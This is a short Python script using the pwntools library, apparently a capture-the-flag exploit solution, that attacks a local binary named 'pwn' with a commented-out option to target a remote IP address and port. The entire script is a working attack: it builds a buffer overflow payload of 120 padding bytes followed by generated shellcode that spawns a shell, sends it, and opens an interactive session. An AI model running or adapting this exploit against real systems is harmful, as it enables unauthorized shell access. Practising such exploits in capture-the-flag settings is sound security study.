from pwn import *

exe = context.binary = ELF('./pwn')

p = process('./pwn')
#p = remote('123.57.225.26', 42435)


shellcode = asm(shellcraft.sh())

payload = 'A' * 120
payload += shellcode


p.sendline(payload)
p.interactive()


